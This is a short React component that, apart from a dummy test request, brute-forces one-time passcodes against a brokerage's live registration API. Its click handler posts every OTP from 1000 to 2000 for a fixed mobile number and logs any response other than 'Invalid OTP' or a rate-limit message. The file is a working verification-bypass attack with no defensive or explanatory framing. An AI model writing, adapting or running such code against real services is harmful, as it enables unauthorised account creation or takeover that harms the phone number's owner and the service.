import axios from 'axios';
import React from 'react'

const dataObj = {
    "requesterName": "dwdw",
    "requesteeName": "wdwdwd",
    "requesteeContact": "www.linkedin.com/in/alpha-pandey",
    "company": "dwdw",
    "note": "ewewewewe"
}

// const dataObj2 = {
//     "mobile": 9378237827,
// "otp": 4348,
// "promocode": 0 ,
// "URLParams": mobile=9378237827,
// "LeadSource": OnlineStore
// }

// const dataObj2 = new URLSearchParams()

// dataObj2.append("mobile", 9378237827)
// dataObj2.append("otp", 1234)
// dataObj2.append("promocode", '')
// dataObj2.append("LeadSource", 9378237827)

const config = {
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    }
}


export default function faltu() {

    function postt(data) {
        // console.log("faltu init clickedd")
        return axios({
            method: 'post',
            url: 'https://anubhav.aitoss.club/api/v1/request',
            data: data,
        });
    }


    function post_in_5Paisa(data) {
        // console.log("faltu init clickedd") 
        return axios.post('https://www.5paisa.com/api/QuickRegistration', data, config)
    }
    function faltuInit() {
        console.log("faltu post_in_5Paisa clicked")
        for (let i = 1000; i <= 2000; i++) {
            const dataObj2 = new URLSearchParams()

            dataObj2.append("mobile", 9378747827)
            dataObj2.append("otp", i)
            dataObj2.append("promocode", '')
            dataObj2.append("LeadSource", "OnlineStore")


            post_in_5Paisa(dataObj2).then((res) => {
                if(res.data.Message === "Invalid OTP" || res.data.Message === "OTP Verification Limit Exceeded")
                {

                }
                else console.log(res)
            })
        }
    }
    return (
        <div onClick={() => faltuInit()}>
            hello
        </div>
    )
}
